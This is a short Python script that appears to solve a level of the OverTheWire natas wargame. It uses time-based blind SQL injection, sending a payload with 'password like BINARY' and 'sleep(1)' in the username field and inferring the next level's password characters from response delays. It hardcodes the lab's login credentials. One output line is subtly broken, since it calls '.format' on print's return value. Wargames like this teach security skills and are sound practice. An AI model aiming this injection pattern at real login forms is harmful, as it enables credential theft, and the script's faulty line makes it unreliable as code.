#!/bin/python
import requests, string

base_url = "http://natas17.natas.labs.overthewire.org/index.php"
auth_username = "natas17"
auth_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

all_chars = ''.join([string.ascii_letters, string.digits])

password_dictionary = []

for char in all_chars:
  querystr = ''.join(['natas18" and password like BINARY "%',char,'%" and sleep(1) #'])
  payload = { 'username': querystr }
  print("Testing -> " +  char)
  r = requests.post(base_url, auth=(auth_username, auth_password), data=payload)  
  if r.elapsed.seconds >= 1:
    password_dictionary.append(char)
    print("Password Dictionary: {0}").format(''.join(password_dictionary))
print("Dictionary build complete.")

